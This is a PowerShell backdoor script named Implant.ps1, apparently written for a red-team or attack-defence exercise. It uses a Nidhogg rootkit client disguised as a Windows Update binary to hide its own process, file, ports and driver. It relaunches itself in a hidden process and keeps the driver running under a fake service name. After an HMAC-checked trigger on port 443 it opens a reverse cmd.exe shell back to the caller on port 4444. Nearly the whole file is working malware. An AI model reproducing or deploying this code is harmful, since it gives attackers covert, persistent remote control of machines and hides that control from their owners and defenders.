# Implant.ps1 - Final version with Nidhogg hiding + good reverse shell I/O + migration
$SharedSecret = "bluewinstheday!!"
$TriggerPort  = 443
$ReversePort  = 4444

$NidhoggClient   = "C:\Windows\System32\wuauclt.exe"
$TargetProcName  = "explorer"   # Change to svchost, dllhost, etc. for different stealth

function Invoke-Nidhogg {
    param([string]$Cmd)
    if (Test-Path $NidhoggClient) {
        try { & $NidhoggClient @($Cmd.Split()) | Out-Null } catch {}
    }
}

# ====================== MIGRATION ======================
function Invoke-Migration {
    try {
        $target = Get-Process -Name $TargetProcName -ErrorAction Stop | Select-Object -First 1
        if (-not $target) { throw }

        Write-Host "[+] Migrating to $TargetProcName.exe (PID $($target.Id))" -ForegroundColor Yellow

        $implantPath = "C:\Windows\System32\Implant.ps1"
        $cmd = "-NoP -NonI -W Hidden -ExecutionPolicy Bypass -File `"$implantPath`""

        # Launch new instance under target session
        Start-Process powershell.exe -ArgumentList $cmd -WindowStyle Hidden -PassThru | Out-Null

        Start-Sleep -Seconds 3

        # Hide new PowerShell and kill old one
        $newPS = Get-Process -Name powershell | 
                 Where-Object { $_.Id -ne $PID -and $_.StartTime -gt (Get-Date).AddSeconds(-15) } | 
                 Select-Object -First 1

        if ($newPS) {
            Invoke-Nidhogg "process hide $($newPS.Id)"
            Write-Host "[+] Migration successful → New PID: $($newPS.Id)" -ForegroundColor Green
            Stop-Process -Id $PID -Force
        }
        return $true
    }
    catch {
        Write-Host "[-] Migration failed, continuing in current process" -ForegroundColor Yellow
        return $false
    }
}

# ====================== INITIAL HIDING ======================
$MyPID = $PID
Invoke-Nidhogg "process hide $MyPID"
Invoke-Nidhogg "file hide C:\Windows\System32\Implant.ps1"
Invoke-Nidhogg "port hide $TriggerPort tcp remote"
Invoke-Nidhogg "port hide $ReversePort tcp remote"

# Attempt migration once
$null = Invoke-Migration

while ($true) {
    try {
        # Keep driver alive + re-hide
        if ((sc.exe query WindowsUpdateSvc | Select-String "RUNNING") -eq $null) {
            sc.exe start WindowsUpdateSvc | Out-Null
            Invoke-Nidhogg "driver hide C:\Windows\System32\drivers\Nidhogg.sys"
        }

        if ((Get-Random -Maximum 10) -eq 0) {
            Invoke-Nidhogg "process hide $PID"
            Invoke-Nidhogg "port hide $TriggerPort tcp remote"
            Invoke-Nidhogg "port hide $ReversePort tcp remote"
        }

        # ====================== LISTENER ======================
        $listener = $null
        try {
            $listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0', $TriggerPort)
            $listener.Server.SetSocketOption([System.Net.Sockets.SocketOptionLevel]::Socket, 
                                             [System.Net.Sockets.SocketOptionName]::ReuseAddress, $true)
            $listener.Start()

            $client = $listener.AcceptTcpClient()
            $stream = $client.GetStream()
            $reader = New-Object System.IO.StreamReader($stream)
            $writer = New-Object System.IO.StreamWriter($stream)
            $writer.AutoFlush = $true

            # HMAC Challenge
            $challenge = Get-Random -Maximum 1000000000
            $writer.WriteLine("CHALLENGE:$challenge")

            $response = $reader.ReadLine().Trim()

            $hmac = New-Object System.Security.Cryptography.HMACSHA256
            $hmac.Key = [Text.Encoding]::UTF8.GetBytes($SharedSecret)
            $expected = -join (( $hmac.ComputeHash([Text.Encoding]::UTF8.GetBytes("$challenge")) | 
                                ForEach-Object { $_.ToString("x2") } ))

            if ($response -eq $expected) {
                $writer.WriteLine("OK - Launching reverse shell...")
                Start-Sleep -Seconds 1

                $remoteIP = $client.Client.RemoteEndPoint.Address.ToString()
                $listener.Stop()

                # ====================== REVERSE SHELL with GOOD I/O ======================
                $revClient = New-Object System.Net.Sockets.TcpClient($remoteIP, $ReversePort)
                $revStream = $revClient.GetStream()
                $revWriter = New-Object System.IO.StreamWriter($revStream)
                $revReader = New-Object System.IO.StreamReader($revStream)
                $revWriter.AutoFlush = $true

                $process = New-Object System.Diagnostics.Process
                $process.StartInfo.FileName = "cmd.exe"
                $process.StartInfo.Arguments = "/Q"
                $process.StartInfo.RedirectStandardInput = $true
                $process.StartInfo.RedirectStandardOutput = $true
                $process.StartInfo.RedirectStandardError = $true
                $process.StartInfo.UseShellExecute = $false
                $process.StartInfo.CreateNoWindow = $true
                $process.StartInfo.WindowStyle = "Hidden"
                $process.Start() | Out-Null

                # Hide the shell process
                Invoke-Nidhogg "process hide $($process.Id)"

                # Async handlers
                $outputAction = { param($s, $e); try { if ($e.Data) { $revWriter.WriteLine($e.Data) } } catch {} }
                $errorAction  = { param($s, $e); try { if ($e.Data) { $revWriter.WriteLine("[ERR] $($e.Data)") } } catch {} }

                $outEvent = Register-ObjectEvent $process.StandardOutput "OutputDataReceived" -Action $outputAction
                $errEvent = Register-ObjectEvent $process.StandardError  "ErrorDataReceived"  -Action $errorAction

                $process.BeginOutputReadLine()
                $process.BeginErrorReadLine()

                try {
                    while (-not $process.HasExited -and $revClient.Connected) {
                        if ($revStream.DataAvailable) {
                            $cmd = $revReader.ReadLine()
                            if ($cmd) { $process.StandardInput.WriteLine($cmd) }
                        }
                        Start-Sleep -Milliseconds 50
                    }
                } finally {
                    if ($outEvent) { Unregister-Event -SourceIdentifier $outEvent.Name -EA SilentlyContinue }
                    if ($errEvent) { Unregister-Event -SourceIdentifier $errEvent.Name -EA SilentlyContinue }
                    if (-not $process.HasExited) { $process.Kill() }
                    $revClient.Close()
                }
            } else {
                $writer.WriteLine("DENIED")
                Start-Sleep -Seconds 8
            }
        }
        catch {} 
        finally { 
            if ($listener) { $listener.Stop() } 
        }

        Start-Sleep -Seconds 3
    }
    catch {
        Start-Sleep -Seconds 30
    }
}